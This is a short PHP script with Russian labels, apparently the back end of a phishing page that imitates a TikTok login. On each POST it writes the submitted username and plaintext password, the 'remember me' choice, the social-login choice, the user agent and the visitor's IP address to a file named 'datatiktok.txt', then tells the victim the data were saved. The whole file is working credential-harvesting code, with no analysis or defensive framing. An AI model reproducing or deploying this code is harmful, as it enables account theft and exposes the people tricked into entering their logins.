<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? 'unknown';
    
    $data = "=== НОВЫЙ ВХОД ===\n";
    $data .= "Время: " . date('Y-m-d H:i:s') . "\n";
    $data .= "Действие: " . $action . "\n";
    
    if ($action === 'login') {
        $data .= "Логин: " . ($_POST['username'] ?? 'N/A') . "\n";
        $data .= "Пароль: " . ($_POST['password'] ?? 'N/A') . "\n";
        $data .= "Запомнить: " . (($_POST['remember'] ?? 'false') === 'on' ? 'Да' : 'Нет') . "\n";
    } elseif ($action === 'social_login') {
        $data .= "Социальная сеть: " . ($_POST['social_login'] ?? 'N/A') . "\n";
    }
    
    $data .= "User Agent: " . ($_POST['user_agent'] ?? 'N/A') . "\n";
    $data .= "IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'N/A') . "\n";
    $data .= "========================\n\n";
    
    // Сохраняем в файл
    file_put_contents('datatiktok.txt', $data, FILE_APPEND | LOCK_EX);
    
    // Ответ для клиента
    echo "Данные успешно сохранены";
} else {
    http_response_code(405);
    echo "Метод не разрешен";
}
?>